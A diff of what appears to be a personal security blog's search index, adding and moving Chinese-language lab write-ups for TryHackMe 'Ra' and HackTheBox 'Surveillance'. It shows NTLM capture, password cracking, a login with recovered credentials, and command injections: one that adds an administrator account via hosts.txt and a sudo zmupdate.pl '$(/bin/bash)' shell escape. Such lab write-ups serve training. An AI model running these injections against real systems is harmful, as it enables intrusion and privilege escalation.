@@ -202,7 +202,7 @@
 <h3 id="cartesian-2"><a href="#cartesian-2" class="headerlink" title="cartesian-2"></a>cartesian-2</h3><ul>
 <li>solver Elliot_404<br>上LinkedIn搜尋Terrence Descartes，會看到一個跟前面Instagram帳號同樣頭像的，點下去<br><a href="https://www.linkedin.com/in/terrence-descartes-54642831a/">https://www.linkedin.com/in/terrence-descartes-54642831a/</a><br>查看第一則貼文的第二張照片，裡面有寫flag(2&#x2F;1)<br><img src="https://hackmd.io/_uploads/ryuHquo_C.jpg" alt="1721434962084"></li>
 </ul>
-<p>利用<a href="https://epieos.com/">epieos</a>搜尋<a href="mailto:&#x74;&#x65;&#x72;&#114;&#101;&#110;&#x63;&#x65;&#x64;&#101;&#115;&#99;&#x61;&#x72;&#116;&#101;&#x73;&#64;&#x67;&#109;&#x61;&#x69;&#x6c;&#x2e;&#99;&#111;&#x6d;">&#x74;&#x65;&#x72;&#114;&#101;&#110;&#x63;&#x65;&#x64;&#101;&#115;&#99;&#x61;&#x72;&#116;&#101;&#x73;&#64;&#x67;&#109;&#x61;&#x69;&#x6c;&#x2e;&#99;&#111;&#x6d;</a>(用姓名猜出來的)<br>Google Calendar右邊的連結點進去<br><a href="https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com">https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com</a><br>題目說要觀察他去年夏天旅行，所以前往2023年6月，會看到SUMMER TRIP!!!，點下去就能看到flag(2&#x2F;2)了<br><img src="https://hackmd.io/_uploads/rkf8TdjdA.png" alt="screencapture-calendar-google-calendar-u-0-embed-2024-07-22-14_32_59"></p>
+<p>利用<a href="https://epieos.com/">epieos</a>搜尋<a href="mailto:&#x74;&#x65;&#x72;&#x72;&#x65;&#110;&#x63;&#x65;&#100;&#x65;&#x73;&#x63;&#x61;&#114;&#116;&#x65;&#x73;&#64;&#103;&#x6d;&#97;&#105;&#x6c;&#x2e;&#x63;&#111;&#x6d;">&#x74;&#x65;&#x72;&#x72;&#x65;&#110;&#x63;&#x65;&#100;&#x65;&#x73;&#x63;&#x61;&#114;&#116;&#x65;&#x73;&#64;&#103;&#x6d;&#97;&#105;&#x6c;&#x2e;&#x63;&#111;&#x6d;</a>(用姓名猜出來的)<br>Google Calendar右邊的連結點進去<br><a href="https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com">https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com</a><br>題目說要觀察他去年夏天旅行，所以前往2023年6月，會看到SUMMER TRIP!!!，點下去就能看到flag(2&#x2F;2)了<br><img src="https://hackmd.io/_uploads/rkf8TdjdA.png" alt="screencapture-calendar-google-calendar-u-0-embed-2024-07-22-14_32_59"></p>
 <h3 id="cartesian-3"><a href="#cartesian-3" class="headerlink" title="cartesian-3"></a>cartesian-3</h3><ul>
 <li>solver Elliot_404<blockquote>
 <p><a href="http://cartesian.chal.imaginaryctf.org/">http://cartesian.chal.imaginaryctf.org/</a></p>
@@ -210,7 +210,7 @@
 </li>
 </ul>
 <ol>
-<li><p>What is your email?<br>A: <a href="mailto:&#x74;&#x65;&#x72;&#x72;&#x65;&#x6e;&#99;&#x65;&#x64;&#x65;&#x73;&#99;&#97;&#x72;&#116;&#x65;&#x73;&#x40;&#x67;&#109;&#97;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;">&#x74;&#x65;&#x72;&#x72;&#x65;&#x6e;&#99;&#x65;&#x64;&#x65;&#x73;&#99;&#97;&#x72;&#116;&#x65;&#x73;&#x40;&#x67;&#109;&#97;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;</a><br>用姓名去猜即可</p>
+<li><p>What is your email?<br>A: <a href="mailto:&#116;&#x65;&#x72;&#114;&#x65;&#x6e;&#x63;&#x65;&#x64;&#x65;&#x73;&#x63;&#x61;&#x72;&#x74;&#101;&#x73;&#x40;&#103;&#109;&#97;&#105;&#x6c;&#x2e;&#99;&#111;&#x6d;">&#116;&#x65;&#x72;&#114;&#x65;&#x6e;&#x63;&#x65;&#x64;&#x65;&#x73;&#x63;&#x61;&#x72;&#x74;&#101;&#x73;&#x40;&#103;&#109;&#97;&#105;&#x6c;&#x2e;&#99;&#111;&#x6d;</a><br>用姓名去猜即可</p>
 </li>
 <li><p>On what day were you born? (YYYY-MM-DD)<br>A: 2001-01-18<br>此篇<a href="https://www.instagram.com/p/C9lkBOjxQCW/">Instagram貼文</a>是他的半歲生日慶祝文，用發文日期減去6個月後即是他的生日，年份的部分則在名稱中就透露了</p>
 </li>
@@ -2407,6 +2407,61 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
+    <title>Ra Write Up on TryHackMe</title>
+    <url>/2024/07/28/ra/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>這台…好難qwq<br>燒了快六小時  </p>
+<p>Victim’s IP : 10.10.31.87<br>Victim’s Host : windcorp.thm<br>Attacker’s IP : 10.9.195.189  </p>
+<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h2 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h2><h3 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h3><p><strong>command</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.31.87 --ulimit 5000 -- -sC -sV -PN</span><br></pre></td></tr></table></figure>
+<p><strong>result</strong><br><img src="https://hackmd.io/_uploads/BkE0li7YR.png" alt="image">  </p>
+<p>發現開啟了 DNS SERVER, Kerberos, smb, ldap, web service(port 80&amp;9090), jabber&#x2F;openfire支援的一些東西, winrm和rpc呼叫。  </p>
+<p><img src="https://hackmd.io/_uploads/H16SGimFA.png" alt="image">  </p>
+<p>也獲得域名 fire.windcorp.thm 以及 windcorp.thm</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="password-reset-through-information-gathering"><a href="#password-reset-through-information-gathering" class="headerlink" title="password reset through information gathering"></a>password reset through information gathering</h3><p><img src="https://hackmd.io/_uploads/H1XCfj7tR.png" alt="image">  </p>
+<p>進入網站後發現password reset按鈕，點擊後會進到 <code>http://fire.windcorp.thm/reset.asp</code><br><img src="https://hackmd.io/_uploads/H1vbXoQtR.png" alt="image">  </p>
+<p>重新觀察主頁，注意到合照：<br><img src="https://hackmd.io/_uploads/H1hVmsQK0.png" alt="image">  </p>
+<p>url為<code>http://10.10.31.87/img/lilyleAndSparky.jpg</code><br>猜測寵物名稱為 Sparky<br>輸入Reset Password表單後獲得密碼<code>ChangeMe#1234</code><br><img src="https://hackmd.io/_uploads/rJZ9XjmFR.png" alt="image">  </p>
+<h3 id="Phshing-through-openfire-Spark-XSS"><a href="#Phshing-through-openfire-Spark-XSS" class="headerlink" title="Phshing through openfire Spark XSS"></a>Phshing through openfire Spark XSS</h3><p><em>這部分我還沒找到 reference qwq，有好心人看到請戳我一下</em><br><em>不過真的有看到一陀XSS XD</em><br>從 <a href="https://www.igniterealtime.org/downloads/">(download link)</a> 取得 spark<br>寄給主頁身分是綠色ㄉBuse<br><strong>payload</strong><br><img src="https://hackmd.io/_uploads/ByUDH27FA.png" alt="image">  </p>
+<p>開啟 responder  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo responder -I tun0</span><br></pre></td></tr></table></figure>
+<p>成功接到NTLM HASH (Windows再開啟HTML TAG上的URL時會用NTLM2進行驗證)<br><img src="https://hackmd.io/_uploads/ryagL3mFC.png" alt="image">  </p>
+<p>利用john進行密碼爆破<br><img src="https://hackmd.io/_uploads/BJlRL3mY0.png" alt="image"></p>
+<p>成功取得buse的帳號密碼  </p>
+<p>利用 evil-winrm 登入成功  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -u buse -p uzunLM+3131 -i 10.10.31.87</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/BydbP3mYA.png" alt="image">  </p>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Abusing-Account-Operato"><a href="#Abusing-Account-Operato" class="headerlink" title="Abusing Account Operato"></a>Abusing Account Operato</h3><blockquote>
+<p>觀察 1<br>利用 <code>whoami</code> 系列指令作權限檢查，其中 group 包含 Account Operator<br><img src="https://hackmd.io/_uploads/rJi2v2QFA.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>觀察 2<br><strong>C:\scripts\checkservers.ps1</strong></p>
+</blockquote>
+<figure class="highlight ps"><table><tr><td class="code"><pre><span class="line"><span class="comment"># reset the lists of hosts prior to looping</span></span><br><span class="line"><span class="variable">$OutageHosts</span> = <span class="variable">$Null</span></span><br><span class="line"><span class="comment"># specify the time you want email notifications resent for hosts that are down</span></span><br><span class="line"><span class="variable">$EmailTimeOut</span> = <span class="number">30</span></span><br><span class="line"><span class="comment"># specify the time you want to cycle through your host lists.</span></span><br><span class="line"><span class="variable">$SleepTimeOut</span> = <span class="number">45</span></span><br><span class="line"><span class="comment"># specify the maximum hosts that can be down before the script is aborted</span></span><br><span class="line"><span class="variable">$MaxOutageCount</span> = <span class="number">10</span></span><br><span class="line"><span class="comment"># specify who gets notified</span></span><br><span class="line"><span class="variable">$notificationto</span> = <span class="string">&quot;brittanycr@windcorp.thm&quot;</span></span><br><span class="line"><span class="comment"># specify where the notifications come from</span></span><br><span class="line"><span class="variable">$notificationfrom</span> = <span class="string">&quot;admin@windcorp.thm&quot;</span></span><br><span class="line"><span class="comment"># specify the SMTP server</span></span><br><span class="line"><span class="variable">$smtpserver</span> = <span class="string">&quot;relay.windcorp.thm&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># start looping here</span></span><br><span class="line"><span class="keyword">Do</span>&#123;</span><br><span class="line"><span class="variable">$available</span> = <span class="variable">$Null</span></span><br><span class="line"><span class="variable">$notavailable</span> = <span class="variable">$Null</span></span><br><span class="line"><span class="built_in">Write-Host</span> (<span class="built_in">Get-Date</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read the File with the Hosts every cycle, this way to can add/remove hosts</span></span><br><span class="line"><span class="comment"># from the list without touching the script/scheduled task,</span></span><br><span class="line"><span class="comment"># also hash/comment (#) out any hosts that are going for maintenance or are down.</span></span><br><span class="line"><span class="built_in">get-content</span> C:\Users\brittanycr\hosts.txt | <span class="built_in">Where-Object</span> &#123;!(<span class="variable">$_</span> <span class="operator">-match</span> <span class="string">&quot;#&quot;</span>)&#125; |</span><br><span class="line"><span class="built_in">ForEach-Object</span> &#123;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&quot;Test-Connection -ComputerName <span class="variable">$_</span> -Count 1 -ea silentlycontinue&quot;</span></span><br><span class="line">    <span class="built_in">Invoke-Expression</span> <span class="variable">$p</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$p</span>)</span><br><span class="line">    &#123;</span><br><span class="line">     <span class="comment"># if the Host is available then just write it to the screen</span></span><br><span class="line">     <span class="built_in">write-host</span> <span class="string">&quot;Available host ---&gt; &quot;</span><span class="variable">$_</span> <span class="literal">-BackgroundColor</span> Green <span class="literal">-ForegroundColor</span> White</span><br><span class="line">     [<span class="built_in">Array</span>]<span class="variable">$available</span> += <span class="variable">$_</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">     <span class="comment"># If the host is unavailable, give a warning to screen</span></span><br><span class="line">     <span class="built_in">write-host</span> <span class="string">&quot;Unavailable host ------------&gt; &quot;</span><span class="variable">$_</span> <span class="literal">-BackgroundColor</span> Magenta <span class="literal">-ForegroundColor</span> White</span><br><span class="line">     <span class="variable">$p</span> = <span class="built_in">Test-Connection</span> <span class="literal">-ComputerName</span> <span class="variable">$_</span> <span class="literal">-Count</span> <span class="number">1</span> <span class="literal">-ea</span> silentlycontinue</span><br><span class="line">     <span class="keyword">if</span>(!(<span class="variable">$p</span>))</span><br><span class="line">       &#123;</span><br><span class="line">        <span class="comment"># If the host is still unavailable for 4 full pings, write error and send email</span></span><br><span class="line">        <span class="built_in">write-host</span> <span class="string">&quot;Unavailable host ------------&gt; &quot;</span><span class="variable">$_</span> <span class="literal">-BackgroundColor</span> Red <span class="literal">-ForegroundColor</span> White</span><br><span class="line">        [<span class="built_in">Array</span>]<span class="variable">$notavailable</span> += <span class="variable">$_</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$OutageHosts</span> <span class="operator">-ne</span> <span class="variable">$Null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="variable">$OutageHosts</span>.ContainsKey(<span class="variable">$_</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                 <span class="comment"># First time down add to the list and send email</span></span><br><span class="line">                 <span class="built_in">Write-Host</span> <span class="string">&quot;<span class="variable">$_</span> Is not in the OutageHosts list, first time down&quot;</span></span><br><span class="line">                 <span class="variable">$OutageHosts</span>.Add(<span class="variable">$_</span>,(<span class="built_in">get-date</span>))</span><br><span class="line">                 <span class="variable">$Now</span> = <span class="built_in">Get-date</span></span><br><span class="line">                 <span class="variable">$Body</span> = <span class="string">&quot;<span class="variable">$_</span> has not responded for 5 pings at <span class="variable">$Now</span>&quot;</span></span><br><span class="line">                 <span class="built_in">Send-MailMessage</span> <span class="literal">-Body</span> <span class="string">&quot;<span class="variable">$body</span>&quot;</span> <span class="literal">-to</span> <span class="variable">$notificationto</span> <span class="literal">-from</span> <span class="variable">$notificationfrom</span> `</span><br><span class="line">                  <span class="literal">-Subject</span> <span class="string">&quot;Host <span class="variable">$_</span> is down&quot;</span> <span class="literal">-SmtpServer</span> <span class="variable">$smtpserver</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment"># If the host is in the list do nothing for 1 hour and then remove from the list.</span></span><br><span class="line">                    <span class="built_in">Write-Host</span> <span class="string">&quot;<span class="variable">$_</span> Is in the OutageHosts list&quot;</span></span><br><span class="line">                    <span class="keyword">if</span> (((<span class="built_in">Get-Date</span>) - <span class="variable">$OutageHosts</span>.Item(<span class="variable">$_</span>)).TotalMinutes <span class="operator">-gt</span> <span class="variable">$EmailTimeOut</span>)</span><br><span class="line">                    &#123;<span class="variable">$OutageHosts</span>.Remove(<span class="variable">$_</span>)&#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment"># First time down create the list and send email</span></span><br><span class="line">                <span class="built_in">Write-Host</span> <span class="string">&quot;Adding <span class="variable">$_</span> to OutageHosts.&quot;</span></span><br><span class="line">                <span class="variable">$OutageHosts</span> = <span class="selector-tag">@</span>&#123;<span class="variable">$_</span>=(<span class="built_in">get-date</span>)&#125;</span><br><span class="line">                <span class="variable">$Body</span> = <span class="string">&quot;<span class="variable">$_</span> has not responded for 5 pings at <span class="variable">$Now</span>&quot;</span></span><br><span class="line">                <span class="built_in">Send-MailMessage</span> <span class="literal">-Body</span> <span class="string">&quot;<span class="variable">$body</span>&quot;</span> <span class="literal">-to</span> <span class="variable">$notificationto</span> <span class="literal">-from</span> <span class="variable">$notificationfrom</span> `</span><br><span class="line">                 <span class="literal">-Subject</span> <span class="string">&quot;Host <span class="variable">$_</span> is down&quot;</span> <span class="literal">-SmtpServer</span> <span class="variable">$smtpserver</span></span><br><span class="line">            &#125;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># Report to screen the details</span></span><br><span class="line"><span class="variable">$log</span> = <span class="string">&quot;Last run: <span class="variable">$</span>(Get-Date)&quot;</span></span><br><span class="line"><span class="built_in">write-host</span> <span class="variable">$log</span></span><br><span class="line"><span class="built_in">Set-Content</span> <span class="literal">-Path</span> C:\scripts\log.txt <span class="literal">-Value</span> <span class="variable">$log</span></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;Available count:&quot;</span><span class="variable">$available</span>.count</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;Not available count:&quot;</span><span class="variable">$notavailable</span>.count</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;Not available hosts:&quot;</span></span><br><span class="line"><span class="variable">$OutageHosts</span></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;Sleeping <span class="variable">$SleepTimeOut</span> seconds&quot;</span></span><br><span class="line"><span class="built_in">sleep</span> <span class="variable">$SleepTimeOut</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$OutageHosts</span>.Count <span class="operator">-gt</span> <span class="variable">$MaxOutageCount</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment"># If there are more than a certain number of host down in an hour abort the script.</span></span><br><span class="line">    <span class="variable">$Exit</span> = <span class="variable">$True</span></span><br><span class="line">    <span class="variable">$body</span> = <span class="variable">$OutageHosts</span> | <span class="built_in">Out-String</span></span><br><span class="line">    <span class="built_in">Send-MailMessage</span> <span class="literal">-Body</span> <span class="string">&quot;<span class="variable">$body</span>&quot;</span> <span class="literal">-to</span> <span class="variable">$notificationto</span> <span class="literal">-from</span> <span class="variable">$notificationfrom</span> `</span><br><span class="line">     <span class="literal">-Subject</span> <span class="string">&quot;More than <span class="variable">$MaxOutageCount</span> Hosts down, monitoring aborted&quot;</span> <span class="literal">-SmtpServer</span> <span class="variable">$smtpServer</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$Exit</span> <span class="operator">-ne</span> <span class="variable">$True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>重點在這一段：  </p>
+<figure class="highlight ps"><table><tr><td class="code"><pre><span class="line"><span class="built_in">get-content</span> C:\Users\brittanycr\hosts.txt | <span class="built_in">Where-Object</span> &#123;!(<span class="variable">$_</span> <span class="operator">-match</span> <span class="string">&quot;#&quot;</span>)&#125; |</span><br><span class="line"><span class="built_in">ForEach-Object</span> &#123;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&quot;Test-Connection -ComputerName <span class="variable">$_</span> -Count 1 -ea silentlycontinue&quot;</span></span><br><span class="line">    <span class="built_in">Invoke-Expression</span> <span class="variable">$p</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$p</span>)</span><br></pre></td></tr></table></figure>
+<p>會將C:\Users\brittanycr\hosts.txt裡面的所有內容切行以後塞進 For-Each 那邊的 $p 變數，並利用 <code>Invoke-Expression</code> 將它作為指令執行<br>結合它是每45秒跑一次，高機率是一個 cronjob，嘗試利用 Buse 的權限更改 brittanycr 的密碼：<br><strong>command</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user brittanycr whale120? /domain</span><br></pre></td></tr></table></figure>
+
+<p>以 smbclient 登入成功，利用put指令把本地的惡意hosts.txt丟上去：   </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;net user whale120 wh@le120 /add;net localgroup Administrators whale120 /add</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/r1m022XFR.png" alt="image">  </p>
+<p>等一下，用 evil-winrm 遠端登入並確認身分  </p>
+<p><img src="https://hackmd.io/_uploads/H1mBanmKC.png" alt="image"></p>
+<p>成功拿到 Administrators Group  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>Account Opertors權限利用的其他方式<br><a href="https://secframe.com/guides/acct_ops_attacked/">https://secframe.com/guides/acct_ops_attacked&#x2F;</a></p>
+]]></content>
+      <tags>
+        <tag>AD</tag>
+        <tag>Active Directory</tag>
+        <tag>Windows</tag>
+        <tag>Pentesting</tag>
+        <tag>TryHackMe</tag>
+        <tag>Account Operators</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Reset on Tryhackme</title>
     <url>/2024/06/01/reset-thm/</url>
     <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>好久沒打ADㄌ，開心&gt;w&lt;<br>而且今天學到超多東西，也釐清了不少觀念  </p>
@@ -2552,36 +2607,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
-    <title>Surveillance Write Up on HackTheBox</title>
-    <url>/2024/04/08/surveillance-htb/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>沒想像中難ㄉ靶機，好欸今天晚上目前打了兩台owob<br><del>也順便先去把昨天的wifi給打完了</del>  </p>
-<p>Attacker’s IP : 10.10.14.92<br>Victim’s IP : 10.10.11.245<br>Victim’s Host : surveillance.htb  </p>
-<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><p><del>打HTB以來一直想直接跳過這步驟的撰寫</del>  </p>
-<h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><img src="https://hackmd.io/_uploads/B1NLQd-lC.png" alt="image"><br>port 22是ssh<br>port 80是一個web服務  </p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="CVE-2023-41892"><a href="#CVE-2023-41892" class="headerlink" title="CVE-2023-41892"></a>CVE-2023-41892</h4><p>連進去web服務，發現是由 Craft CMS 建立的：<br><img src="https://hackmd.io/_uploads/Sk-gNOWeC.png" alt="image"><br>本來打算用2024年的另一個CVE打不過發現有patch，經過簡單的搜尋就改成使用CVE-2023-41892的漏洞直接進行RCE。<br>使用腳本：<a href="https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226">https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226</a><br><img src="https://hackmd.io/_uploads/rk3rVd-lC.png" alt="image">  </p>
-<p>彈到 port 1004 get shell  </p>
-<p><img src="https://hackmd.io/_uploads/BJSRS_bgC.png" alt="image">  </p>
-<h3 id="Privilege-Esacalation"><a href="#Privilege-Esacalation" class="headerlink" title="Privilege Esacalation"></a>Privilege Esacalation</h3><h4 id="password-cracking"><a href="#password-cracking" class="headerlink" title="password cracking"></a>password cracking</h4><p>彈進去的時候所在的目錄是：<code>/var/www/html/craft/web/cpresources</code><br>簡單逛兩圈就會在<code>/var/www/html/craft/storage/backups</code>  發現一個zip檔案：<code>surveillance--2023-10-17-202801--v4.4.14.sql.zip</code><br>在目標主機用<code>python3 -m http.server</code>簡單建立一個http server後把檔案抓回來解壓縮後看，發現使用者<code>matthew</code>的密碼hash<br><img src="https://hackmd.io/_uploads/ryftUdWlC.png" alt="image"><br>利用密碼爆破工具john搭配rockyou.txt進行字典攻擊：<br><strong>command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john pass --wordlist=~/rockyou.txt --format=Raw-SHA256</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/rJ6nLd-l0.png" alt="image">  </p>
-<p><img src="https://hackmd.io/_uploads/SkDCUOWeA.png" alt="image"><br>用<code>su</code>切去matthew的身分就好 :D  </p>
-<h4 id="Exploiting-ZoneMinder"><a href="#Exploiting-ZoneMinder" class="headerlink" title="Exploiting ZoneMinder"></a>Exploiting ZoneMinder</h4><p>在linpeas裡面看到這個，上網google一下<del>然後全部都是Write up</del><br><img src="https://hackmd.io/_uploads/r1-qwd-l0.png" alt="image"><br>總之，他在內網開了一個ZoneMinder的服務，要先把它串出來：<br><strong>command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -L 8091:127.0.0.1:8080 matthew@10.10.11.245</span><br></pre></td></tr></table></figure>
-<p>接著利用<code>CVE-2023-26035</code>的漏洞拿RCE<br><a href="https://github.com/rvizx/CVE-2023-26035/blob/main/exploit.py">https://github.com/rvizx/CVE-2023-26035/blob/main/exploit.py</a>  </p>
-<p><img src="https://hackmd.io/_uploads/HJzY_O-lA.png" alt="image"><br>在本地彈到使用者zoneminder的權限<br><img src="https://hackmd.io/_uploads/B1Kh_OZg0.png" alt="image">  </p>
-<p>這麼做的目的應該就是讓它可以合理操控zoneminder的相關perl腳本(?)  </p>
-<p><a href="https://vk9-sec.com/privilege-escalation-zoneminder-scripts-command-injection-local/">https://vk9-sec.com/privilege-escalation-zoneminder-scripts-command-injection-local/</a>  </p>
-<p>上網google找到這個command injection，照打：  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/zmupdate.pl --version 1 --user=<span class="string">&#x27;$(/bin/bash)&#x27;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/H1LbFO-gC.png" alt="image"><br>發現無法輸出，只好再串一個reverse shell出來(<br><img src="https://hackmd.io/_uploads/SyCXYdZg0.png" alt="image"><br>結束owob  </p>
-<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>今天晚上還會再打一台麻~<br>挑題easy的練手感(?)  </p>
-]]></content>
-      <tags>
-        <tag>Pentesting</tag>
-        <tag>HackTheBox</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2023 SunShine CTF Write Up</title>
     <url>/2023/10/14/sunshinectf/</url>
     <content><![CDATA[<p>Team Name:WAN<br>Rank:74<br><a href="https://2023.sunshinectf.org/teams/295">Link:https://2023.sunshinectf.org/teams/295</a>  </p>
@@ -2715,6 +2740,36 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>SunShine CTF</tag>
         <tag>Forensics</tag>
         <tag>Scripting</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Surveillance Write Up on HackTheBox</title>
+    <url>/2024/04/08/surveillance-htb/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>沒想像中難ㄉ靶機，好欸今天晚上目前打了兩台owob<br><del>也順便先去把昨天的wifi給打完了</del>  </p>
+<p>Attacker’s IP : 10.10.14.92<br>Victim’s IP : 10.10.11.245<br>Victim’s Host : surveillance.htb  </p>
+<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><p><del>打HTB以來一直想直接跳過這步驟的撰寫</del>  </p>
+<h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><img src="https://hackmd.io/_uploads/B1NLQd-lC.png" alt="image"><br>port 22是ssh<br>port 80是一個web服務  </p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="CVE-2023-41892"><a href="#CVE-2023-41892" class="headerlink" title="CVE-2023-41892"></a>CVE-2023-41892</h4><p>連進去web服務，發現是由 Craft CMS 建立的：<br><img src="https://hackmd.io/_uploads/Sk-gNOWeC.png" alt="image"><br>本來打算用2024年的另一個CVE打不過發現有patch，經過簡單的搜尋就改成使用CVE-2023-41892的漏洞直接進行RCE。<br>使用腳本：<a href="https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226">https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226</a><br><img src="https://hackmd.io/_uploads/rk3rVd-lC.png" alt="image">  </p>
+<p>彈到 port 1004 get shell  </p>
+<p><img src="https://hackmd.io/_uploads/BJSRS_bgC.png" alt="image">  </p>
+<h3 id="Privilege-Esacalation"><a href="#Privilege-Esacalation" class="headerlink" title="Privilege Esacalation"></a>Privilege Esacalation</h3><h4 id="password-cracking"><a href="#password-cracking" class="headerlink" title="password cracking"></a>password cracking</h4><p>彈進去的時候所在的目錄是：<code>/var/www/html/craft/web/cpresources</code><br>簡單逛兩圈就會在<code>/var/www/html/craft/storage/backups</code>  發現一個zip檔案：<code>surveillance--2023-10-17-202801--v4.4.14.sql.zip</code><br>在目標主機用<code>python3 -m http.server</code>簡單建立一個http server後把檔案抓回來解壓縮後看，發現使用者<code>matthew</code>的密碼hash<br><img src="https://hackmd.io/_uploads/ryftUdWlC.png" alt="image"><br>利用密碼爆破工具john搭配rockyou.txt進行字典攻擊：<br><strong>command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john pass --wordlist=~/rockyou.txt --format=Raw-SHA256</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/rJ6nLd-l0.png" alt="image">  </p>
+<p><img src="https://hackmd.io/_uploads/SkDCUOWeA.png" alt="image"><br>用<code>su</code>切去matthew的身分就好 :D  </p>
+<h4 id="Exploiting-ZoneMinder"><a href="#Exploiting-ZoneMinder" class="headerlink" title="Exploiting ZoneMinder"></a>Exploiting ZoneMinder</h4><p>在linpeas裡面看到這個，上網google一下<del>然後全部都是Write up</del><br><img src="https://hackmd.io/_uploads/r1-qwd-l0.png" alt="image"><br>總之，他在內網開了一個ZoneMinder的服務，要先把它串出來：<br><strong>command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -L 8091:127.0.0.1:8080 matthew@10.10.11.245</span><br></pre></td></tr></table></figure>
